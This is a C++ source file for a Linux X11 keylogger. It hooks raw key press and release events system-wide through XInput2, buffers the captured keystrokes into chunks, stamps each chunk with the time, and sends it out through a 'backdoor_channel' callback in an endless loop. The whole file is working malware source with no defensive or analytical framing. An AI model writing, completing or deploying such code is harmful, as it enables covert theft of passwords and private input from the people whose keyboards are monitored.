#include "keylogger.h"
#include <X11/XKBlib.h>
#include <X11/extensions/XInput2.h>

#include <string>
#include <fstream>
#include <iostream>
#include <string>
#include <time.h>
#include <iostream>
#include <iomanip>
#include <ctime>
#include <sstream>

void Key_Logger::start() {

    const char * hostname = DEFAULT_DISPLAY;
    bool printKeyUps = DEFAULT_PRINT_UP;
    std::string buffer;
    int buffersize = 256;

    // Set up X
    Display * disp = XOpenDisplay(hostname);
    if (NULL == disp) {
        fprintf(stderr, "Cannot open X display: %s\n", hostname);
        exit(1);
    }

    // Test for XInput 2 extension
    int xi_opcode;
    int queryEvent, queryError;
    if (! XQueryExtension(disp, "XInputExtension", &xi_opcode,
            &queryEvent, &queryError))
    {
        // XXX Test version >=2
        fprintf(stderr, "X Input extension not available\n");
        return;
    }

    // Register events
    Window root = DefaultRootWindow(disp);
    XIEventMask m;
    m.deviceid = XIAllMasterDevices;
    m.mask_len = XIMaskLen(XI_LASTEVENT);
    m.mask = (unsigned char*)calloc(m.mask_len, sizeof(char));
    XISetMask(m.mask, XI_RawKeyPress);
    XISetMask(m.mask, XI_RawKeyRelease);
    XISelectEvents(disp, root, &m, 1);
    XSync(disp, false);
    free(m.mask);

    while (1) { // Forever

        while(buffer.length() < buffersize){
            XEvent event;
            XGenericEventCookie *cookie = (XGenericEventCookie*)&event.xcookie;
            XNextEvent(disp, &event);

            if (XGetEventData(disp, cookie) && cookie->type == GenericEvent &&
                    cookie->extension == xi_opcode)
            {
                switch (cookie->evtype){
                    case XI_RawKeyRelease:
                        if (!printKeyUps)
                            continue;
                    case XI_RawKeyPress: {
                        XIRawEvent *ev = (XIRawEvent*)cookie->data;

                        // Ask X what it calls that key
                        KeySym s = XkbKeycodeToKeysym(disp, ev->detail, 0, 0);
                        if (NoSymbol == s)
                            continue;
                        char *str = XKeysymToString(s);
                        if (NULL == str)
                            continue;

                        if (printKeyUps)
                            buffer += cookie->evtype == XI_RawKeyPress ? "+" : "-";
                            //printf("%s", cookie->evtype == XI_RawKeyPress ? "+" : "-");
                            
                            //writefile(DEFAULT_OUT_FILE, cookie->evtype == XI_RawKeyPress ? "+" : "-");
                        buffer += std::string(str);
                        printf("%s\n", str);

                        break;
                    }
                }
            }    
            //fflush(stdout);
        }

        //get datatime
        auto t = std::time(nullptr);
        auto tm = *std::localtime(&t);
        std::ostringstream oss;
        oss << std::put_time(&tm, "%d-%m-%Y %H-%M-%S");
        auto str = oss.str();//datetimestring

        backdoor_channel.callback_sendNewFile(str, buffer);
        buffer.clear();
        
    }
}
